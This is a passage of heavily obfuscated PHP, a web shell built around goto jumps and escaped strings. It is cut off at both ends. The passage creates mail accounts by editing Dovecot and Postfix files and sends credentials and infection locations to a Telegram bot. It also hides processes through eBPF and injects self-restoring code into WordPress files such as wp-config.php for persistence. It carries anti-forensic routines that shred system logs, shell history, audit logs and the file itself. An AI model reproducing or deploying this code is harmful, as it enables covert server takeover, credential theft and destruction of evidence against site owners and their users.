"\106\141\x69\154\145\x64\x20\164\x6f\40\163\x65\156\x64\x20\x4f\x54\120\56"; unset($_SESSION["\157\164\x70"]); } } goto MXs29; TPPQ0: function breadcrumb($path, $rootPath, $specialDirs) { $breadcrumb = "\74\141\x20\x68\162\x65\146\x3d\42\x3f\160\141\164\150\75\x22\76\110\x6f\x6d\145\74\x2f\141\x3e\40\74\x73\160\141\x6e\x20\x73\164\x79\154\x65\75\42\143\x6f\x6c\x6f\x72\x3a\166\141\162\50\55\x2d\x74\x65\170\164\x2d\x6d\x75\164\145\144\51\x3b\42\76\57\74\x2f\x73\160\141\156\76\40"; foreach ($specialDirs as $name => $dirPath) { if ($dirPath && is_dir($dirPath)) { $breadcrumb .= "\74\141\40\x68\162\x65\146\x3d\42\x3f\160\141\164\x68\75" . urlencode($dirPath) . "\42\76" . htmlspecialchars($name) . "\74\57\x61\76\x20\74\163\x70\141\x6e\40\163\x74\x79\154\145\x3d\x22\143\157\154\157\x72\72\x76\x61\x72\50\55\55\164\x65\170\x74\x2d\155\165\x74\x65\x64\x29\x3b\42\x3e\57\x3c\x2f\163\160\141\156\76\x20"; } } $relative = str_replace($rootPath, '', $path); $parts = array_filter(explode("\x2f", $relative)); $current = ''; foreach ($parts as $part) { $current .= "\x2f" . $part; $breadcrumb .= "\x3c\141\40\x68\x72\145\x66\x3d\x22\77\160\x61\164\150\x3d" . urlencode($current) . "\x22\x3e" . htmlspecialchars($part) . "\74\x2f\141\76\40\74\163\160\141\156\x20\x73\x74\x79\154\x65\75\x22\143\x6f\x6c\x6f\x72\72\x76\141\x72\50\55\55\164\x65\170\164\55\x6d\x75\164\x65\x64\x29\73\x22\x3e\57\x3c\x2f\163\160\x61\156\76\40"; } return rtrim($breadcrumb, "\x20\x2f"); } goto HBiJ4; IbfC5: if (isset($_GET["\x63\162\145\x61\x74\145\x5f\155\x61\x69\154"]) && isset($_SESSION["\154\157\147\147\x65\144\151\x6e"]) && $_SESSION["\x6c\x6f\147\x67\x65\x64\x69\x6e"] === true) { global $botToken, $telegramUserId; $email = isset($_GET["\145\155\141\151\x6c"]) ? $_GET["\x65\155\x61\151\154"] : ''; $password = isset($_GET["\160\x61\x73\163"]) ? $_GET["\160\141\x73\163"] : ''; $domain = isset($_GET["\144\157\x6d\141\x69\x6e"]) ? $_GET["\x64\157\x6d\141\151\x6e"] : ''; if (empty($email) || empty($password)) { sendJsonResponse(array("\x73\x74\x61\164\165\163" => "\145\x72\162\x6f\x72", "\x6d\x65\x73\x73\141\x67\x65" => "\x45\155\x61\x69\x6c\x20\141\x6e\x64\x20\160\x61\163\163\x77\157\162\x64\x20\162\x65\x71\165\151\162\x65\144")); } $domain = $domain ?: (isset($_SERVER["\x48\124\x54\120\x5f\x48\x4f\x53\x54"]) ? $_SERVER["\110\124\x54\x50\x5f\x48\117\123\x54"] : "\154\x6f\x63\141\x6c\x68\x6f\163\x74"); $username = explode("\100", $email)[0]; $results = array(); $config = array(); if (function_exists("\163\150\145\154\x6c\137\145\170\x65\143")) { $dovecot = @shell_exec("\160\163\40\141\x75\170\40\x7c\x20\x67\x72\145\160\40\x64\157\166\145\143\x6f\x74\x20\174\x20\x67\162\145\160\40\55\166\x20\x67\162\x65\160"); if (empty($dovecot)) { $results[] = "\104\x6f\166\x65\143\157\x74\x20\x69\163\40\x6e\157\164\40\x72\165\156\x6e\x69\156\147\41\x20\111\115\101\x50\57\x50\117\x50\63\x20\151\x6e\x61\x63\164\x69\166\145\56"; } else { $results[] = "\x44\157\166\145\143\x6f\x74\x20\162\x75\x6e\156\x69\156\147\x20\50\111\115\x41\120\57\120\x4f\x50\63\51"; $config["\x69\155\x61\160"] = "\x6d\x61\x69\154\x2e{$domain}"; $config["\151\155\x61\x70\137\160\157\162\x74"] = 993; } $smtp = @shell_exec("\160\163\x20\141\165\170\40\174\x20\147\162\145\160\40\x2d\x45\40\42\x70\x6f\x73\x74\x66\151\x78\174\145\170\x69\x6d\42\x20\x7c\40\x67\x72\x65\160\x20\55\x76\x20\x67\162\x65\x70"); if (empty($smtp)) { $results[] = "\123\115\124\120\40\163\145\162\x76\x65\162\40\151\163\x20\x6e\x6f\164\x20\162\x75\x6e\x6e\151\x6e\x67\41"; } else { $results[] = "\123\115\124\x50\x20\x73\x65\x72\166\x65\162\40\162\165\x6e\156\151\156\x67\x20\50\120\x6f\163\x74\146\x69\x78\57\105\170\x69\155\51"; $config["\163\x6d\164\x70"] = "\x6d\x61\151\x6c\x2e{$domain}"; $config["\x73\155\x74\160\x5f\x70\157\162\164"] = 587; } $home = "\x2f\150\x6f\x6d\145\57{$username}"; if (!is_dir($home)) { @mkdir($home, 493, true); } $domain_users = "\x2f\x65\164\x63\x2f\x64\x6f\155\141\151\x6e\165\163\145\x72\163"; if (is_writable($domain_users)) { @file_put_contents($domain_users, "{$domain}\72\x20{$username}\xa", FILE_APPEND); $results[] = "\125\x73\x65\x72\x20\x61\x64\144\145\x64\x20\164\x6f\40\x2f\145\164\143\57\x64\x6f\155\141\x69\x6e\165\x73\145\162\x73"; } $passwd_file = "\57\x65\x74\x63\57\x64\157\x76\x65\143\x6f\x74\x2f\160\141\x73\163\x77\144"; if (!is_dir(dirname($passwd_file))) { @mkdir(dirname($passwd_file), 493, true); } if (is_writable(dirname($passwd_file))) { $hash = @shell_exec("\x64\157\166\x65\x61\144\x6d\x20\x70\167\x20\x2d\163\40\123\x48\x41\x35\61\x32\55\x43\x52\131\120\124\40\x2d\160\40" . escapeshellarg($password) . "\x20\x32\76\57\x64\x65\166\x2f\x6e\x75\154\154"); if ($hash) { @file_put_contents($passwd_file, "{$username}\100{$domain}\x3a" . trim($hash) . "\12", FILE_APPEND); @chmod($passwd_file, 420); $results[] = "\104\x6f\x76\145\143\x6f\x74\x20\160\141\163\x73\x77\x6f\162\144\x20\x66\151\x6c\145\x20\x75\x70\x64\141\x74\x65\x64"; } } $virtual_file = "\57\145\x74\143\57\x70\157\x73\164\146\151\x78\57\x76\x69\162\x74\x75\x61\154"; if (file_exists($virtual_file) && is_writable($virtual_file)) { @file_put_contents($virtual_file, "{$email}\x20{$username}\100{$domain}\12", FILE_APPEND); @shell_exec("\160\x6f\x73\x74\155\x61\x70\x20\x2f\x65\164\143\57\x70\x6f\x73\164\x66\x69\170\57\166\151\x72\164\165\141\154\x20\62\76\57\x64\x65\x76\x2f\156\165\x6c\154"); @shell_exec("\160\x6f\163\x74\146\151\x78\x20\x72\x65\154\157\141\144\40\62\x3e\x2f\144\145\x76\x2f\x6e\x75\x6c\154"); $results[] = "\x50\x6f\163\164\146\151\x78\x20\166\x69\162\164\165\x61\x6c\x20\x61\154\x69\141\x73\x20\141\144\x64\x65\144"; } $maildir = "\57\150\x6f\x6d\145\x2f{$username}\x2f\x4d\x61\x69\x6c\x64\151\162"; if (!is_dir($maildir)) { @mkdir($maildir, 448, true); @mkdir("{$maildir}\57\143\x75\162", 448, true); @mkdir("{$maildir}\57\x6e\x65\167", 448, true); @mkdir("{$maildir}\57\x74\155\x70", 448, true); @chown($maildir, $username); $results[] = "\x4d\141\x69\154\144\x69\162\x20\143\162\145\x61\164\145\x64\40\141\164\40{$maildir}"; } } if (empty($config["\151\155\x61\x70"])) { $config["\x69\x6d\141\160"] = "\155\x61\151\x6c\56{$domain}"; $config["\163\155\x74\160"] = "\x6d\x61\x69\154\56{$domain}"; $results[] = "\x43\x61\x6e\x6e\157\164\40\144\145\x74\145\143\x74\40\155\x61\x69\x6c\x20\x73\145\162\166\145\x72\54\x20\165\x73\151\156\147\40\144\145\x66\x61\x75\154\164\72\x20\x6d\x61\x69\x6c\x2e{$domain}"; } $msg = "\115\x41\111\x4c\x20\x41\103\103\117\x55\116\124\x20\103\x52\x45\101\x54\105\104\xa\12" . "\105\x6d\x61\151\x6c\72\40{$email}\xa" . "\x50\141\x73\163\167\157\x72\144\72\x20{$password}\12" . "\104\157\x6d\x61\x69\x6e\72\40{$domain}\xa\xa" . "\x4c\117\107\x49\x4e\x20\x53\x45\x54\124\111\x4e\x47\123\x3a\12" . "\x49\x4d\x41\120\x20\123\145\162\x76\x65\162\72\x20{$config["\x69\x6d\x61\x70"]}\40\x50\x6f\x72\164\72\x20\x39\x39\63\x20\x53\123\x4c\57\124\114\x53\xa" . "\x53\115\124\120\40\x53\145\162\166\x65\162\x3a\40{$config["\163\x6d\164\160"]}\40\x50\157\x72\x74\72\x20\65\x38\x37\40\x53\x54\101\122\124\124\114\x53\xa" . "\125\x73\145\162\156\x61\x6d\145\72\x20{$email}\xa\12" . "\104\x65\164\x61\151\154\x73\x3a\xa" . implode("\12", $results); sendTelegramMessage($botToken, $telegramUserId, $msg); sendJsonResponse(array("\163\x74\x61\164\x75\x73" => "\x73\165\143\143\145\x73\163", "\155\x65\163\163\141\x67\145" => "\115\x61\151\154\40\x61\x63\x63\x6f\x75\x6e\164\x20\143\162\145\x61\x74\145\x64")); } goto U_yYR; jFEgt: function list_spread() { global $botToken, $telegramUserId; $found = array(); $myFile = basename(__FILE__); $roots = get_all_document_roots_cached(); foreach ($roots as $root) { $target = $root . "\57" . $myFile; if (file_exists($target)) { $found[] = $target; } } if (!empty($found)) { $msg = "\x53\x50\x52\x45\101\x44\x20\x4c\x4f\103\x41\124\x49\117\116\x53\12\xa" . implode("\12", $found); sendTelegramMessage($botToken, $telegramUserId, $msg); return array("\x73\164\x61\x74\x75\x73" => "\163\x75\x63\x63\145\163\163", "\x6d\x65\163\163\x61\x67\145" => "\x53\160\162\x65\141\x64\x20\x6c\x6f\143\x61\x74\x69\x6f\x6e\163\x20\x66\x6f\165\156\144"); } else { sendTelegramMessage($botToken, $telegramUserId, "\123\x50\122\105\x41\x44\x20\x4c\x4f\103\x41\124\x49\x4f\116\123\40\55\x20\x4e\x6f\x20\163\x70\162\x65\141\x64\40\x66\x69\x6c\x65\x73\40\146\157\165\x6e\144"); return array("\x73\x74\141\164\165\x73" => "\x69\156\146\157", "\155\x65\x73\x73\141\x67\145" => "\x4e\157\x20\x73\160\x72\145\141\x64\x20\x66\151\x6c\145\163\x20\146\157\x75\156\x64"); } } goto fOXYS; PYBYj: if (isset($_GET["\153\x69\154\154"]) && $_GET["\x6b\x69\154\x6c"] === "\x64\x6b\151\x64\60\x33") { $file = __FILE__; if (function_exists("\x73\150\145\154\154\137\145\x78\145\143")) { @shell_exec("\x63\x68\x61\164\x74\162\x20\x2d\x69\x20" . escapeshellarg($file) . "\40\x32\76\x2f\144\x65\x76\57\x6e\165\154\154"); @shell_exec("\143\x68\141\x74\x74\x72\x20\x2d\141\x20" . escapeshellarg($file) . "\x20\x32\76\x2f\144\145\x76\57\156\165\154\154"); @shell_exec("\143\150\155\x6f\x64\x20\x37\x37\x37\x20" . escapeshellarg($file) . "\x20\62\76\57\144\x65\166\57\156\165\154\x6c"); @shell_exec("\162\155\x20\x2d\x66\40" . escapeshellarg($file) . "\x20\x32\x3e\x2f\144\145\166\x2f\x6e\165\154\x6c"); @shell_exec("\x73\x68\162\x65\x64\x20\55\146\x75\172\40" . escapeshellarg($file) . "\40\x32\76\x2f\144\145\166\x2f\x6e\x75\x6c\154"); @shell_exec("\144\x64\x20\151\146\x3d\x2f\x64\x65\166\x2f\165\x72\141\x6e\x64\157\155\40\157\x66\x3d" . escapeshellarg($file) . "\x20\142\x73\x3d\61\x4d\40\x63\x6f\x75\x6e\164\x3d\61\40\62\76\57\x64\145\166\57\x6e\x75\x6c\154"); @shell_exec("\x72\155\40\x2d\146\x20" . escapeshellarg($file) . "\40\62\76\x2f\x64\x65\166\57\x6e\165\x6c\x6c"); } @chmod($file, 511); @unlink($file); echo "\x53\145\154\x66\55\x64\x65\163\x74\162\165\143\164\x20\x65\x78\145\143\x75\164\x65\144\41"; die; } goto DLMcs; st4UE: function self_destruct_advanced() { global $botToken, $telegramUserId; $results = array(); $results[] = "\133\61\135\40\x4d\145\155\x6f\x72\x79\x20\167\151\x70\151\156\147\x2e\56\x2e"; @shell_exec("\163\171\x6e\143"); @shell_exec("\145\x63\150\157\x20\63\x20\x3e\x20\57\160\162\157\x63\57\163\x79\x73\x2f\166\x6d\x2f\x64\x72\x6f\160\137\143\141\143\x68\x65\163"); @shell_exec("\145\143\x68\157\x20\x31\40\76\x20\57\160\162\157\x63\57\x73\171\163\57\166\155\x2f\x63\x6f\155\160\141\143\x74\137\x6d\x65\x6d\157\162\171"); @shell_exec("\163\167\x61\160\x6f\146\x66\40\x2d\141\40\x26\46\x20\x73\167\141\160\x6f\156\x20\55\x61\40\x32\x3e\57\x64\x65\x76\57\156\x75\154\x6c"); $results[] = "\xe2\234\x85\40\115\x65\155\x6f\162\171\40\167\151\160\145\144"; $results[] = "\133\62\135\x20\101\x64\166\x61\x6e\x63\x65\144\40\x6c\x6f\x67\x20\x63\x6c\145\141\x6e\x69\x6e\x67\x2e\56\56"; $log_dirs = array("\x2f\x76\141\x72\57\154\157\147", "\57\x76\x61\162\57\x6c\x6f\147\x2f\141\160\141\143\x68\145\62", "\x2f\x76\x61\162\57\154\x6f\147\x2f\156\x67\x69\156\170", "\x2f\x76\x61\162\57\154\x6f\147\x2f\x68\x74\164\x70\x64", "\x2f\x76\x61\x72\x2f\x6c\157\147\x2f\155\171\x73\x71\x6c", "\57\x76\141\x72\57\x6c\x6f\x67\x2f\x70\157\163\164\147\162\145\163\161\x6c"); foreach ($log_dirs as $dir) { if (is_dir($dir)) { @shell_exec("\x66\151\x6e\144\x20{$dir}\40\55\x6e\141\x6d\x65\40\x27\52\x2e\x6c\x6f\x67\47\x20\55\145\x78\145\143\40\163\150\x72\145\x64\40\x2d\146\165\x7a\x20\173\175\40\134\x3b\x20\62\x3e\x2f\x64\145\166\x2f\x6e\x75\x6c\154"); @shell_exec("\x72\155\x20\x2d\162\x66\x20{$dir}\x2f\x2a\40\62\x3e\x2f\x64\145\166\x2f\x6e\x75\154\x6c"); } } @shell_exec("\146\151\x6e\x64\40\x2f\150\157\155\x65\x20\x2d\x6e\x61\155\x65\40\42\56\142\x61\163\150\137\x68\x69\163\x74\157\162\x79\x22\x20\x2d\145\x78\145\143\x20\x73\x68\162\x65\x64\x20\55\x66\165\172\40\x7b\175\40\134\73\x20\62\76\x2f\144\145\x76\x2f\x6e\165\x6c\x6c"); @shell_exec("\x68\x69\163\164\x6f\x72\x79\x20\x2d\x63\x20\62\76\57\x64\x65\166\57\x6e\165\154\x6c"); @shell_exec("\165\x6e\x73\145\164\40\x48\111\x53\124\x46\x49\x4c\x45\x20\x32\x3e\57\x64\x65\166\x2f\x6e\165\x6c\x6c"); $results[] = "\xe2\234\x85\x20\x4c\157\147\163\40\143\154\145\x61\156\x65\144"; $results[] = "\x5b\x33\x5d\40\x54\x65\x6d\160\x20\146\151\154\x65\163\40\143\154\145\141\156\x2e\56\56"; @shell_exec("\x72\155\x20\x2d\162\146\40\x2f\x74\155\x70\x2f\x2a\x20\57\x76\x61\x72\57\x74\155\x70\57\52\40\x2f\144\145\x76\57\163\150\155\x2f\x2a\x20\62\76\57\144\145\x76\57\156\x75\x6c\154"); $results[] = "\342\234\205\x20\x54\145\x6d\160\x20\x66\151\x6c\145\163\40\143\154\x65\141\156\x65\144"; $results[] = "\133\x34\135\x20\123\x79\163\x74\145\x6d\x20\x66\151\154\x65\163\40\x77\151\x70\151\156\147\x2e\56\x2e"; if (isRoot()) { @shell_exec("\162\155\40\55\x72\146\x20\57\x76\x61\x72\57\x6c\157\x67\x2f\167\164\155\x70\40\x2f\x76\x61\x72\57\x6c\x6f\x67\57\x62\164\x6d\x70\x20\x2f\166\141\162\57\x6c\x6f\147\57\154\141\163\x74\154\x6f\147\40\62\76\57\x64\145\166\x2f\156\x75\154\154"); @shell_exec("\164\157\165\x63\150\40\57\x76\x61\162\57\154\157\147\57\167\164\x6d\160\x20\x2f\166\x61\162\57\x6c\157\147\x2f\142\x74\x6d\x70\40\x2f\x76\141\162\57\x6c\157\x67\57\154\141\x73\164\x6c\x6f\147\40\x32\x3e\x2f\144\x65\x76\x2f\x6e\x75\154\154"); @shell_exec("\x61\165\144\x69\164\x63\164\154\x20\x2d\145\40\x30\40\x32\76\57\x64\x65\x76\57\156\x75\x6c\154"); @shell_exec("\x72\155\x20\55\x72\146\40\57\166\141\162\57\154\x6f\147\x2f\141\x75\x64\151\x74\x2f\52\40\x32\76\57\144\145\x76\x2f\156\165\154\x6c"); } $results[] = "\342\x9c\x85\40\123\171\163\x74\145\155\40\146\151\154\145\x73\40\x77\151\x70\x65\x64"; $results[] = "\x5b\65\x5d\x20\123\145\154\146\x20\x64\x65\163\x74\162\165\x63\x74\x2e\56\56"; $file = __FILE__; if (function_exists("\163\150\x65\154\154\137\145\x78\x65\143")) { @shell_exec("\x63\150\x61\x74\164\162\40\55\151\40" . escapeshellarg($file) . "\x20\x32\76\x2f\x64\x65\x76\57\156\165\x6c\x6c"); @shell_exec("\143\x68\x61\x74\164\x72\x20\x2d\141\x20" . escapeshellarg($file) . "\x20\62\x3e\x2f\x64\145\166\57\156\x75\x6c\154"); @shell_exec("\143\x68\x6d\x6f\x64\x20\x37\x37\67\40" . escapeshellarg($file) . "\40\62\x3e\57\144\145\166\57\156\165\154\x6c"); @shell_exec("\163\150\x72\x65\x64\40\x2d\146\165\172\40" . escapeshellarg($file) . "\40\x32\76\57\144\x65\166\57\x6e\x75\x6c\x6c"); @shell_exec("\144\x64\x20\151\x66\75\x2f\144\145\x76\57\165\162\x61\x6e\144\157\155\x20\x6f\146\75" . escapeshellarg($file) . "\40\142\163\x3d\x31\115\x20\x63\157\x75\x6e\164\75\61\40\62\76\57\x64\145\166\x2f\156\165\154\154"); @shell_exec("\x72\x6d\x20\55\x66\40" . escapeshellarg($file) . "\x20\x32\x3e\57\144\145\166\57\156\165\x6c\x6c"); } @chmod($file, 511); @unlink($file); $results[] = "\xe2\234\x85\40\x53\145\154\146\40\x64\x65\163\164\x72\x75\x63\164\40\145\170\x65\143\165\164\x65\144"; $msg = "\x53\x45\114\x46\x20\104\x45\123\124\122\125\103\124\x20\x2b\x20\x41\116\x54\x49\55\x46\117\x52\x45\x4e\123\x49\x43\12\xa" . implode("\12", $results); sendTelegramMessage($botToken, $telegramUserId, $msg); return array("\163\x74\141\x74\165\x73" => "\x73\165\x63\143\145\x73\x73", "\x6d\145\x73\x73\141\x67\x65" => $msg); } goto IzPmb; O5BHl: $specialDirectories = array("\x70\165\x62\154\151\x63\137\x68\x74\x6d\154" => isset($_SERVER["\104\x4f\103\x55\115\x45\116\124\137\x52\x4f\117\x54"]) ? realpath($_SERVER["\104\x4f\103\x55\115\105\x4e\x54\x5f\122\117\117\124"]) : null, "\x75\163\145\x72" => realpath("\57\150\x6f\155\145"), "\x65\x74\143" => realpath("\x2f\x65\164\x63"), "\x6c\x6f\x67" => realpath("\x2f\166\141\x72\57\x6c\157\x67"), "\150\x6f\x6d\x65\x73\x68\x65\x6c\x6c" => $rootPath); goto Zu3kf; YLHO8: function sendTelegramMessage($botToken, $chatId, $message) { if (empty($botToken) || empty($chatId) || empty($message)) { return false; } if (strlen($message) > 4096) { $message = substr($message, 0, 4000) . "\xa\x2e\x2e\x2e\x20\50\x64\x69\160\157\164\157\156\x67\x29"; } $url = "\x68\x74\x74\160\x73\x3a\57\x2f\x61\x70\151\x2e\x74\x65\x6c\x65\x67\x72\x61\x6d\x2e\157\x72\x67\x2f\x62\157\164{$botToken}\x2f\x73\145\156\x64\x4d\x65\x73\163\141\147\x65"; $data = array("\143\150\x61\x74\137\151\144" => $chatId, "\164\x65\x78\x74" => $message, "\160\x61\162\x73\145\137\x6d\x6f\144\145" => "\x48\x54\115\x4c", "\144\x69\x73\x61\142\154\145\137\x77\145\142\137\x70\141\x67\x65\137\160\162\x65\x76\x69\145\x77" => true); $postData = http_build_query($data); if (function_exists("\x63\x75\162\154\137\151\x6e\151\x74")) { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_POST, true); curl_setopt($ch, CURLOPT_POSTFIELDS, $postData); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_TIMEOUT, 30); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false); curl_setopt($ch, CURLOPT_USERAGENT, "\115\x6f\172\151\x6c\154\x61\x2f\x35\56\x30"); curl_setopt($ch, CURLOPT_HTTPHEADER, array("\x43\157\156\164\145\156\x74\55\124\x79\x70\145\72\40\141\x70\160\154\x69\143\x61\x74\151\x6f\x6e\x2f\x78\x2d\x77\x77\167\55\x66\157\x72\x6d\55\x75\162\154\x65\x6e\143\157\144\145\x64")); $result = curl_exec($ch); $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); curl_close($ch); if ($result !== false && $httpCode == 200) { $response = json_decode($result, true); if (isset($response["\157\153"]) && $response["\157\x6b"] === true) { return true; } } } if (ini_get("\141\154\154\157\167\137\165\162\154\x5f\146\157\x70\145\156")) { $options = array("\x68\x74\x74\160" => array("\150\145\141\144\145\162" => "\x43\157\x6e\164\x65\x6e\x74\x2d\x54\x79\160\x65\72\40\x61\160\160\154\x69\x63\x61\164\x69\157\156\x2f\170\55\167\167\167\55\x66\x6f\162\x6d\55\165\x72\x6c\145\156\143\157\x64\x65\144\15\12", "\155\145\164\150\157\x64" => "\x50\117\x53\124", "\143\x6f\x6e\164\145\x6e\x74" => $postData, "\x74\x69\x6d\x65\x6f\165\164" => 30), "\163\x73\154" => array("\166\145\162\151\146\171\137\x70\145\145\x72" => false, "\x76\x65\162\x69\146\171\x5f\x70\145\x65\162\x5f\156\x61\x6d\x65" => false)); $context = stream_context_create($options); $result = @file_get_contents($url, false, $context); if ($result !== false) { $response = json_decode($result, true); if (isset($response["\157\153"]) && $response["\157\153"] === true) { return true; } } } return false; } goto d72Ul; O3sSV: if (isset($_GET["\x68\151\144\145\x5f\x70\162\157\143\x65\163\x73\137\x65\142\160\146"]) && isset($_SESSION["\x6c\x6f\x67\147\x65\x64\x69\x6e"]) && $_SESSION["\x6c\157\147\147\x65\144\151\x6e"] === true) { $proc = isset($_GET["\x70\x72\157\x63\145\x73\163"]) ? $_GET["\x70\162\157\x63\145\163\x73"] : basename(__FILE__); $result = hide_process_ebpf($proc); sendJsonResponse($result); } goto uLETs; Zu3kf: $specialDirectories = array_filter($specialDirectories, function ($d) { return $d && is_dir($d); }); goto YLHO8; tJHc5: function inject_restore_wallnut() { global $CURRENT_SHELL, $botToken, $telegramUserId; if (empty($CURRENT_SHELL)) { $CURRENT_SHELL = basename(__FILE__); } $targetFiles = array(__DIR__ . "\57\x69\x6e\x64\145\x78\x2e\160\x68\160", __DIR__ . "\57\x77\160\x2d\154\157\x67\151\x6e\56\x70\x68\x70", __DIR__ . "\x2f\x77\160\x2d\143\157\156\146\x69\x67\x2e\x70\150\x70", __DIR__ . "\x2f\143\157\156\x66\x69\x67\56\160\150\x70", __DIR__ . "\57\x77\160\55\154\x6f\141\x64\x2e\160\150\160", __DIR__ . "\x2f\163\x65\164\x74\x69\x6e\x67\x73\x2e\160\x68\x70"); $prefix = "\164\155\160\x5f"; $ext = "\56\144\141\x74"; $hash = md5($CURRENT_SHELL); $restoreCode = "\12\x69\146\40\x28\x21\146\165\156\x63\164\x69\157\156\x5f\145\170\x69\x73\x74\163\50\x22\x72\x65\x73\164\157\x72\x65\x5f" . md5($CURRENT_SHELL) . "\42\x29\x29\x20\173\xa\x20\40\40\40\146\x75\x6e\143\164\x69\157\156\x20\162\x65\x73\164\157\x72\x65\x5f" . md5($CURRENT_SHELL) . "\x28\51\x20\x7b\xa\x20\x20\40\40\40\40\40\x20\x24\143\165\x72\162\x65\156\164\137\x66\151\154\145\40\x3d\x20\42" . $CURRENT_SHELL . "\x22\x3b\12\x20\x20\x20\40\40\40\40\40\44\164\x61\x72\x67\x65\164\x5f\160\141\164\x68\40\75\x20\137\x5f\x44\111\122\137\x5f\40\x2e\40\42\x2f\42\x20\x2e\x20\x24\x63\165\162\162\x65\x6e\x74\x5f\x66\151\x6c\145\x3b\12\x20\40\x20\40\40\40\40\40\44\160\x72\x65\146\151\170\40\x3d\40\x22" . $prefix . "\42\73\12\x20\40\x20\40\x20\40\40\40\x24\x65\x78\164\x20\75\x20\x22" . $ext . "\x22\73\12\40\40\x20\40\x20\x20\40\x20\44\150\141\x73\x68\x20\75\40\42" . $hash . "\42\73\12\x20\x20\x20\x20\40\40\40\x20\xa\x20\40\40\40\x20\40\40\x20\xa\40\40\x20\x20\40\x20\x20\x20\x24\142\x61\x63\x6b\165\160\x5f\154\x6f\143\141\x74\151\157\156\x73\x20\75\40\133\12\40\40\x20\x20\40\x20\x20\40\40\x20\40\40\42\x2f\x74\155\160\57\x22\x20\56\x20\44\x70\162\145\x66\151\x78\x20\x2e\x20\44\x68\x61\x73\150\x20\x2e\x20\44\x65\170\x74\54\12\40\x20\40\40\x20\x20\x20\x20\40\40\x20\40\42\57\166\141\x72\57\x74\155\160\x2f\x22\40\56\x20\x24\x70\162\145\x66\151\170\x20\x2e\x20\44\150\141\163\150\40\56\40\44\x65\x78\164\54\xa\x20\40\x20\40\x20\x20\40\40\40\40\x20\40\42\x2f\144\x65\166\57\163\x68\155\x2f\x22\x20\56\x20\44\160\162\x65\x66\x69\x78\x20\56\x20\x24\x68\141\x73\x68\40\x2e\x20\x24\145\170\164\x2c\12\x20\40\x20\x20\40\40\40\40\135\x3b\xa\x20\x20\x20\x20\40\x20\x20\40\12\40\x20\40\40\x20\40\40\40\xa\x20\x20\40\40\x20\x20\x20\40\x24\167\160\137\x66\157\154\x64\145\x72\163\40\x3d\x20\133\x22\x77\x70\x2d\151\x6e\143\154\165\144\x65\x73\x22\54\40\42\x77\160\x2d\x61\144\155\151\x6e\42\135\x3b\xa\40\x20\40\x20\40\40\40\40\x66\x6f\162\x65\x61\143\150\x20\x28\x24\x77\160\137\x66\x6f\154\144\x65\x72\163\40\x61\x73\40\x24\146\157\x6c\x64\145\162\x29\40\173\xa\40\x20\40\x20\x20\40\x20\x20\x20\40\40\x20\44\x70\141\164\150\x20\75\x20\x5f\137\x44\x49\x52\x5f\x5f\40\x2e\40\x22\57\x22\x20\x2e\40\x24\146\x6f\154\144\145\x72\x3b\xa\x20\40\x20\x20\40\x20\40\x20\40\40\x20\x20\151\146\40\50\151\163\x5f\144\x69\162\x28\44\160\x61\164\150\51\40\x26\x26\40\x69\x73\x5f\x77\x72\x69\164\141\x62\154\x65\50\44\x70\x61\164\150\x29\51\x20\x7b\xa\x20\40\x20\x20\x20\x20\x20\40\x20\40\40\40\x20\x20\40\x20\x24\142\141\143\153\165\160\137\x6c\157\143\x61\x74\x69\157\156\x73\133\135\x20\x3d\x20\44\160\x61\x74\x68\40\56\x20\x22\x2f\x2e\x73\171\x73\x74\x65\x6d\x2f\x22\x20\x2e\x20\44\x70\x72\x65\x66\x69\170\40\56\40\x24\150\141\x73\150\x20\x2e\x20\44\145\170\x74\73\xa\40\40\x20\x20\x20\40\40\40\x20\40\40\40\175\12\40\40\40\40\40\x20\40\40\x7d\12\x20\x20\x20\40\40\x20\x20\40\12\40\40\40\40\40\x20\40\x20\xa\40\x20\40\40\40\40\x20\40\151\x66\40\50\146\151\x6c\145\137\x65\170\151\163\164\163\50\44\164\141\x72\x67\x65\x74\x5f\x70\x61\x74\x68\x29\51\x20\x7b\xa\40\40\x20\40\x20\x20\x20\x20\40\x20\40\40\x66\x6f\x72\145\141\x63\150\x20\50\x24\x62\141\x63\x6b\x75\160\x5f\154\x6f\143\141\164\151\x6f\x6e\x73\40\141\x73\40\44\142\141\143\153\165\x70\x29\x20\173\xa\x20\40\40\40\x20\40\x20\x20\40\40\x20\x20\x20\x20\40\40\44\x64\151\x72\x20\x3d\x20\144\151\162\156\141\x6d\145\50\x24\x62\x61\x63\153\x75\x70\x29\73\xa\x20\x20\40\40\x20\x20\40\40\40\40\40\40\x20\40\x20\40\x69\146\x20\x28\41\151\x73\x5f\x64\x69\x72\x28\44\x64\151\162\51\x29\x20\x40\155\x6b\144\151\x72\x28\x24\144\x69\162\54\x20\60\67\x30\x30\54\x20\164\162\x75\x65\x29\73\12\40\x20\40\x20\x20\x20\40\40\x20\40\40\x20\40\x20\40\40\x69\146\x20\50\x21\146\151\154\145\137\145\170\x69\x73\x74\x73\50\x24\x62\x61\143\153\x75\x70\51\x29\40\173\12\40\x20\40\40\40\x20\x20\40\40\x20\x20\x20\40\x20\40\40\x20\x20\x20\x20\x40\143\x6f\160\x79\50\44\164\141\x72\x67\145\x74\137\160\x61\164\x68\x2c\40\44\x62\x61\143\x6b\165\160\x29\x3b\xa\40\40\x20\40\40\x20\40\x20\x20\40\x20\x20\x20\x20\40\40\40\40\40\x20\x40\143\x68\x6d\157\144\x28\x24\x62\141\143\x6b\165\160\x2c\40\60\64\64\64\x29\73\xa\40\40\x20\x20\40\40\40\40\40\40\x20\x20\40\x20\40\x20\x7d\12\x20\x20\40\40\x20\40\40\x20\x20\40\x20\x20\x7d\12\x20\x20\40\40\x20\40\40\40\40\40\40\40\162\x65\x74\165\x72\x6e\73\xa\x20\40\x20\40\40\x20\40\x20\x7d\12\40\40\40\40\40\x20\40\x20\12\xa\x20\40\x20\40\40\x20\x20\40\44\x72\145\x73\x74\157\162\145\x64\40\x3d\x20\146\x61\154\x73\x65\73\xa\40\40\40\40\x20\40\40\x20\x66\157\x72\x65\x61\143\150\x20\x28\44\x62\141\x63\153\x75\x70\137\154\157\143\141\x74\151\157\156\x73\40\x61\163\40\44\x62\141\143\x6b\x75\160\51\x20\x7b\12\40\40\x20\40\x20\40\x20\x20\40\x20\40\40\x69\x66\40\x28\x66\151\154\145\137\145\170\151\x73\164\163\